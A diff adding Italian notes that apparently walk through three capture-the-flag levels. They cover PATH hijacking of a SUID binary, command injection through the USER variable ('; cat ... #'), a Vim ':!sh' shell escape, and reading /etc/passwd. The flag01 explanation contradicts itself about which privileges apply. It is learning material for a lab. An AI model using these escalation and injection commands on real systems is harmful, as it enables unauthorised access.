@@ -1,0 +1,104 @@
+cat /etc/passwd
+getent passwd
+La ”x” indica che la password si trova nel file /etc/shadow.
+
+Per informazione su user/group id e gruppi senza dover consultare /etc/passwd
+$id
+uid=15875(fglmtt) gid=15875 groups=15875
+
+
+
+
+Dato che flag01 ha il bit SUID impostato (-rwsr-xr-x), quando lo esegui, il programma viene avviato 
+con i privilegi dell'utente proprietario (flag01), ma il codice nel programma resetta i privilegi 
+all'utente che lo esegue (level01) prima di eseguire il comando system().
+
+Come sfruttare questa vulnerabilità per leggere flag.txt?
+Il comando system("/usr/bin/env echo and now what?") 
+esegue il comando echo usando /usr/bin/env. L'uso di env apre una possibile vulnerabilità, 
+perché possiamo controllare quali variabili d'ambiente vengono usate.
+
+Possiamo sfruttare questa vulnerabilità manipolando la variabile d'ambiente PATH.
+
+Passaggi per ottenere il contenuto di flag.txt
+Creare un file eseguibile personalizzato che simuli echo
+
+bash
+
+echo "/bin/cat /home/flag01/flag.txt" > /tmp/echo
+chmod +x /tmp/echo
+
+Questo script sostituisce il comando echo con cat /home/flag01/flag.txt, che stamperà il contenuto 
+di flag.txt.
+
+Modificare la variabile d'ambiente PATH per puntare al nostro script
+export PATH=/tmp:$PATH
+Questo fa sì che, quando flag01 chiama echo, venga eseguita la nostra versione invece di quella 
+originale.
+
+Eseguire il programma flag01
+/home/flag01/flag01
+Poiché flag01 esegue /usr/bin/env echo, e noi abbiamo messo la nostra versione di echo in un 
+percorso prioritario (/tmp), il programma in realtà eseguirà:
+/bin/cat /home/flag01/flag.txt
+restituendoci il contenuto del file flag.txt.
+
+Perché funziona?
+
+/usr/bin/env esegue il primo comando echo che trova nel PATH.
+
+Se mettiamo un nostro echo personalizzato in /tmp e cambiamo il PATH, env eseguirà il nostro 
+script invece del vero /bin/echo.
+flag01 viene eseguito con i privilegi di flag01, quindi anche il nostro comando verrà eseguito 
+con quegli stessi privilegi e potrà leggere flag.txt.
+
+
+
+
+
+Il programma ottiene gli ID utente e gruppo effettivi e imposta i suoi privilegi per eseguire i comandi
+come flag02.
+
+Recupera la variabile d'ambiente USER:
+asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
+
+Questo costruisce un comando della forma:
+/bin/echo level02 is cool
+Se possiamo controllare USER, possiamo manipolare il comando.
+
+Poi esegue il comando con:
+system(buffer);
+
+Quindi se possiamo inserire un comando arbitrario nella variabile USER, 
+possiamo eseguire codice con i privilegi di flag02.
+
+export USER="; cat /home/flag02/flag.txt #"
+il comando eseguito sarà:
+/bin/echo ; cat /home/flag02/flag.txt # is cool
+Dove:
+; separa i comandi, quindi cat /home/flag02/flag.txt verrà eseguito separatamente.
+# commenta il resto del comando, evitando errori di sintassi.
+
+
+asprintf() non filtra i caratteri speciali (;), permettendoci di iniettare comandi arbitrari.
+system() esegue il comando generato, quindi possiamo sfruttarlo per eseguire cat flag.txt.
+
+
+
+Una volta dentro Vim, premi:
+:!sh
+Questo avvia una shell con i privilegi dell'utente flag03.
+
+Se l'esecuzione diretta di :!sh non funziona, prova a cambiare la shell predefinita in Vim con:
+:set shell=/bin/bash
+
+Poi prova di nuovo:
+:!sh
+
+Dopo aver ottenuto il contenuto della flag, puoi chiudere la shell con:
+exit
+
+Esci da Vim normalmente
+Premi ESC, poi digita:
+:q!
+
